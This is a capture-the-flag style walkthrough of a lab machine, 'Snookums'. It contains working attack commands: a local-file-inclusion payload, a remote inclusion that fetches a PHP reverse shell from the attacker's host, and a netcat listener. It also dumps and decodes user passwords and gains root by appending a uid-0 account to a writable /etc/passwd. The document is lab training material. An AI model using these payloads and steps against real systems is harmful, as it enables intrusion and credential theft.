@@ -1,0 +1,190 @@
+																							    Snookums Walkthrough
+																										
+Attacker's Machine: 192.168.49.68
+Victim's Machine: 192.168.68.58
+export IP=192.168.68.58
+	
+nmap -Pn -p- -n  --min-rate 1000 $IP --stats-every=5s
+
+21/tcp    open  ftp
+22/tcp    open  ssh
+80/tcp    open  http
+111/tcp   open  rpcbind
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+3306/tcp  open  mysql
+33060/tcp open  mysqlx
+
+nmap -Pn -n -sC -sV -p21,22,80,111,139,445,3306,33060 $IP --open --stats-every=5s -oN results.txt
+
+21/tcp    open  ftp         vsftpd 3.0.2
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: TIMEOUT
+|_End of status
+22/tcp    open  ssh         OpenSSH 7.4 (protocol 2.0)
+80/tcp    open  http        Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
+|_http-title: Simple PHP Photo Gallery
+111/tcp   open  rpcbind     2-4 (RPC #100000)
+139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
+445/tcp   open  netbios-ssn Samba smbd 4.10.4 (workgroup: SAMBA)
+3306/tcp  open  mysql       MySQL (unauthorized)
+33060/tcp open  mysqlx?
+
+nmap -sU -n -Pn $IP --top-ports=100 --stats-every=5s --min-rate 1000
+ <!-- nothing -->
+ 
+Vulnerability Assessment
+
+nmap -n $IP -p 8080 -sV --script vuln --stats-every=5s 
+
+nikto --url $IP
+ <!-- nothing -->
+ 
+Port 80 - Enumeration
+Files
+wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --hc 404,429 -t 30 -R3 "http://$IP/FUZZ"
+wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 404 -t 30 "http://$IP/FUZZ"
+index.php
+image.php
+license.txt
+db.php
+functions.php
+README.txt
+
+Directories
+/js/
+/css/
+/photos/
+/images/
+
+Port 139,445 - Samba
+enum4linux -a $IP
+michael
+
+Exploitation port 80
+
+# Since we have some php files, let's go for some parameter fuzzing
+
+wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt  --hc 404 --hh 1508 "http://$IP/image.php?FUZZ=../../../../../etc/passwd"
+
+# Nice, we've found img parameter to be vulnerable
+
+http://192.168.68.58/image.php?img=../../../../etc/passwd
+
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:99:99:Nobody:/:/sbin/nologin
+systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+polkitd:x:999:998:User for polkitd:/:/sbin/nologin
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+postfix:x:89:89::/var/spool/postfix:/sbin/nologin
+chrony:x:998:996::/var/lib/chrony:/sbin/nologin
+michael:x:1000:1000:Michael:/home/michael:/bin/bash
+apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
+mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false
+tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
+rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
+
+
+# Additionally, you can search online for known exploit for Simple PHP gallery 
+
+https://www.exploit-db.com/exploits/48424
+
+# Now that we have LFI, we can either go for some important files on the system to get credentails from or we should try to see if RFI is possible that will led us upload a reverse shell and execute it.
+   Let's test for RFI
+   
+python3 -m http.server   
+http://192.168.68.58/image.php?img=http://192.168.49.68:22/shell.php
+
+<?php
+$VERSION = "1.0";
+$ip = '192.168.49.68';  // CHANGE THIS
+$port = 80;       // CHANGE THIS
+
+nc -lvnp 80           # Got shell
+
+# Since we don't have access to the only user available on the machine, Michael, we need to find another way to get the first flag.
+
+cat /var/www/html/db.php
+define('DBHOST', '127.0.0.1');
+define('DBUSER', 'root');
+define('DBPASS', 'MalapropDoffUtilize1337');
+define('DBNAME', 'SimplePHPGal');
+
+# Remember that we had mysql present on the machine?, port 3306 and 33060
+
+mysql -uroot -pMalapropDoffUtilize1337
+
+show databases;
+use SimplePHPGal;
+show tables;
+select * from users;
+josh       | VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0=
+michael  | U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==    
+serena   | VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE9PQ== 
+
+# These passwords seems to be base64 encoded, so let's decode them, twice aparently :))
+
+michael    HockSydneyCertify123
+josh         MobilizeHissSeedtime747
+serena     OverallCrestLean000 
+
+# Let's try to login with michael user
+
+su michael
+HockSydneyCertify123
+
+cd /home/michael
+cat local.txt                      # Flag: d6264caf12d0aeb14339d729d04f107c
+
+
+Privilege escalation
+
+id 
+uid=1000(michael) gid=1000(michael) groups=1000(michael) context=system_u:system_r:httpd_t:s0                   #  What the fuck is this shit?
+
+# Nothing really usefull at first sight, no guids or suids, capabilities and shit, let's go for linpeas
+
+Vulnerable to CVE-2021-4034
+
+[+] [CVE-2016-5195] dirtycow
+
+[+] [CVE-2016-5195] dirtycow 2
+
+╔══════════╣ Useful software
+/usr/bin/base64                                                                                                                                                                        
+/usr/bin/curl
+/usr/bin/make
+/usr/bin/perl
+/usr/bin/php
+/usr/bin/ping
+/usr/bin/python
+/usr/bin/python2
+/usr/bin/python2.7
+/usr/bin/sudo
+/usr/bin/wget
+
+# oooo shit, no compilers, bumers
+
+ls -lah /etc/passwd
+-rw-r--r--. 1 michael root 1.2K Jun  9 10:22 /etc/passwd
+
+Aparently the file /etc/passwd is writable by user michael, so let's add a new user
+
+echo 'urs:$1$59od9r.n$mYs3rGkuviFFkes4F7L5Z/:0:0:urs:/home/urs:/bin/bash' >> /etc/passwd 
+
+su urs
+1234
+cd /root
+cat /proof.txt               # Flag: 1d49749cf2afcb4a1f8a1d6291a63bc1
